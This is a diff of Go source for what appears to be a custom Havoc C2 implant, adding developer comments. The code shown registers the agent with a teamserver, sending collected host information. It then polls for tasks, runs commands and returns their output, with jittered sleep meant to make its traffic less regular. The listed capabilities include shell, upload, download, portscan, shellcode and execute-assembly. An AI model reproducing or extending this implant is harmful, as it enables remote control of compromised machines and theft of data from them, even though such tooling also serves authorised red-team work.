@@ -36,13 +36,16 @@ var (
 	agentId = ""
 )
 
-
+// this will probably never get used
+// but I'm too lazy to get rid of it
 func checkError(e error){
 	if e != nil {
 		panic(e)
 	}
 }
 
+// Generates an Agent ID of 4 lowercase letters
+// See: https://codex-7.gitbook.io/codexs-terminal-window/red-team/red-team-dev/extending-havoc-c2/third-party-agents/2-writing-the-agent
 func genHeader(length int) string {
 	var letters = []rune("abcdefghijklmnopqrstuvwxyz")
     header := make([]rune, length)
@@ -52,6 +55,9 @@ func genHeader(length int) string {
     return string(header)
 }
 
+// Sends the initial check-in to register the agent
+// Forms and sends a POST request to teamserver with all required information
+// Heavily reliant on elastic/go-sysinfo
 func registerAgent(url string, magic []byte, agentId string) string{
 	host, err := sysinfo.Host()
 	hostInfo := host.Info()
@@ -82,7 +88,7 @@ func registerAgent(url string, magic []byte, agentId string) string{
 	}
 
 	dat, _ := json.Marshal(registerDict)
-	requestDat := `{"task":"register","data":` + string(dat) + "}"
+	requestDat := `{"task":"register","data":` + string(dat) + "}" // defo a better way to do this but eh
 
 	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
 	size := len(requestDat)+12
@@ -119,6 +125,9 @@ func registerAgent(url string, magic []byte, agentId string) string{
 	}
     defer res.Body.Close()
 
+	// apparently ioutil is deprecated but I'm barely a golang dev
+	// maybe I am now with how much I've done here
+	// that python percent on github is so high though >:(
 	resBody, _ := ioutil.ReadAll(res.Body)
 	if (string(resBody) == "" || resBody == nil) {
 		return "failed"
@@ -179,6 +188,8 @@ func checkIn(dat string, checkInType string) string{
 	return string(resBody)
 }
 
+// with how the handler works right now, if someone just sends a command like `shell`
+// the teamserver will send it, and we need to reject that
 func validateArgs(cmdArgs []string) bool {
 	// shhh not scuffed not scuffed not scuffed not scuffed
 	if utils.Strip(cmdArgs[0]) == "o7" || utils.Strip(cmdArgs[0]) == "ps" {
@@ -196,6 +207,11 @@ func RunCommand(command string) string {
 	cmdArgs := strings.Fields(command)
 	//log.Println(command)
 
+	/*
+		Current commands:
+		shell, o7, kill, ls, ps, upload, download,
+		portscan, shellcode, execute-assembly
+	*/
 	if validateArgs(cmdArgs) {
 		switch (utils.Strip(cmdArgs[0])){
 		case "shell":
@@ -302,6 +318,8 @@ func RunCommand(command string) string {
 }
 
 func main(){
+	// is seeding by time bad?
+	// yes, but it's not used for crypto, so we good :)
 	rand.Seed(time.Now().UnixNano())
 	agentId = genHeader(4)
 
@@ -312,7 +330,7 @@ func main(){
 		time.Sleep((time.Duration(5) * time.Second))
 		timeoutCounter += 1
 		if timeoutCounter > timeoutThreshold {
-			os.Exit(0)
+			os.Exit(0) // silently exit instead of panicing
 		}
 	}
 	timeoutCounter = 0
@@ -321,7 +339,7 @@ func main(){
 	command := ""
 	out := ""
 	r := 1
-	// Begin execution
+	// Begin the implant loop
 	for {
 		command = checkIn("", "gettask")
 		if (len(command) > 4) {
@@ -334,6 +352,8 @@ func main(){
 				checkIn(utils.JsonEscape(out), "commandoutput")
 			}
 		}
+		// This might not be how jitter should be implemented
+		// But we're randomly varying the amount we sleep before continuing so that the requests aren't *too* regular
 		r = rand.Intn(jitterRange)
 		time.Sleep((time.Duration(sleepTime) * time.Second) + (time.Duration(r) * time.Microsecond))
 	}
